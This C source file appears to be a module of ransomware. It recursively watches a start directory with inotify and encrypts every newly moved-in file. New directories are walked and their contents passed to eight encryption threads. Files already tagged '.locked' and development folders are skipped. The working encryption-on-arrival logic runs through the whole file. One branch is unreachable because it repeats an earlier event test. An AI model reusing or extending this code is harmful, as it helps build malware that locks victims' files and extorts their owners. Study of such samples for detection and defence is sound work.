#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <dirent.h>
#include <stdbool.h>
#include "../../headers/queue.h"
#include "../../headers/globals.h"
#include "../../headers/encryption.h"
#include "../../headers/thread.h"

#define BUF_LEN 4096
#define MAX_WATCHES 8192
#define THREADS_NUMBER 8

char watchedPaths[MAX_WATCHES][1024];

void traverse(const char *path);

bool is_skipped(const char *name) {
    if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0)
        return true;
    if (name[0] == '.')
        return true;
    if (name[0] == '_' && name[1] == '_')
        return true;
    if (strcmp(name, "venv") == 0)
        return true;
    if (strcmp(name, "node_modules") == 0)
        return true;
    if (strcmp(name, "site-packages") == 0)
        return true;

    size_t len = strlen(name);
    if (len > 5 && strcmp(name + len - 5, ".part") == 0)
        return true;
    return false;
}

void watcher_traverse(int fd, const char *path) {

    const char *dirname = strrchr(path, '/');
    dirname = dirname ? dirname + 1 : path;
    if (dirname[0] == '.' || (dirname[0] == '_' && dirname[1] == '_'))
        return;

    int wd = inotify_add_watch(fd, path, IN_CREATE | IN_MOVED_TO);

    if (wd == -1) {
        perror("inotify_add_watch");
    } else {
        strncpy(watchedPaths[wd], path, sizeof(watchedPaths[wd]) - 1);
        watchedPaths[wd][sizeof(watchedPaths[wd]) - 1] = '\0';
        printf("watching: %s\n", path);
    }

    DIR *dir = opendir(path);
    if (!dir) {
        perror("opendir");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (is_skipped(entry->d_name))
            continue;

        char fullPath[1024];
        if (snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name) >= sizeof(fullPath)) {
            fprintf(stderr, "Path too long: %s/%s\n", path, entry->d_name);
            continue;
        }

        struct stat statbuf;
        if (lstat(fullPath, &statbuf) == -1) {
            perror("lstat");
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            watcher_traverse(fd, fullPath);
        }
    }
    closedir(dir);
}

void *start_watcher(void *args) {

    int fd = inotify_init();
    watcher_traverse(fd, start_path);

    char buf[BUF_LEN];
    bool clearBuffer = false;

    while (true) {

        if (!watcher_on) {
            clearBuffer = true;
            sleep(1);
            continue;
        }

        if (clearBuffer) {
            clearBuffer = false;
            char discard[BUF_LEN];
            fd_set readable;
            struct timeval instant = {0, 0};
            FD_ZERO(&readable);
            FD_SET(fd, &readable);
            while (select(fd +1, &readable, NULL, NULL, &instant) > 0) {
                read(fd, discard, BUF_LEN);
                FD_ZERO(&readable);
                FD_SET(fd, &readable);
            }
        }

        int len = read(fd, buf, BUF_LEN);

        int i = 0;
        while (i < len) {

            struct inotify_event *event = (struct inotify_event *)&buf[i];

            if (event->len > 0) {

                if (is_skipped(event->name) || strstr(event->name, ".locked") != NULL) {
                    i += sizeof(struct inotify_event) + event->len;
                    continue;
                }

                char full_path[1024];
                if (snprintf(full_path, sizeof(full_path), "%s/%s", watchedPaths[event->wd], event->name) >= sizeof(full_path)) {
                    fprintf(stderr, "Path too long: %s/%s\n", watchedPaths[event->wd], event->name);
                    i += sizeof(struct inotify_event) + event->len;
                    continue;
                }

                if (event->mask & IN_ISDIR && event->mask & IN_MOVED_TO) {
                    watcher_traverse(fd, full_path);
                    clear_queue(&queue);
                    traverse(full_path);
                    enqueue(&queue, "END_ENCRYPT");
                    initialize_threads(THREADS_NUMBER, true);

                } else if (event->mask & IN_ISDIR && event->mask & IN_CREATE) {
                    if (strcmp(watchedPaths[event->wd], start_path) == 0) {
                        sleep(2);
                        watcher_traverse(fd, full_path);
                        clear_queue(&queue);
                        traverse(full_path);
                        enqueue(&queue, "END_ENCRYPT");
                        initialize_threads(THREADS_NUMBER, true);
                    } else {
                        watcher_traverse(fd, full_path);
                    }

                } else if (event->mask & IN_MOVED_TO) {
                    printf("new file: %s\n", full_path);
                    unsigned char key[16];
                    use_key(key);
                    char *locked = encrypt_file((char *)full_path, key);
                    wipe_key(key);
                    if (locked != NULL) {
                        enqueue(&queue, locked);
                        free(locked);
                    }
                }
                else if (event->mask & IN_MOVED_TO || event->mask & IN_CLOSE_WRITE) {
                    if (!is_skipped(event->name)) {
                        printf("new file: %s\n", full_path);
                        unsigned char key[16];
                        use_key(key);
                        char *locked = encrypt_file((char *)full_path, key);
                        wipe_key(key);
                        if (locked != NULL) {
                            enqueue(&queue, locked);
                            free(locked);
                        }
                    }
                }
            }
            i += sizeof(struct inotify_event) + event->len;
        }
    }
    return NULL;
}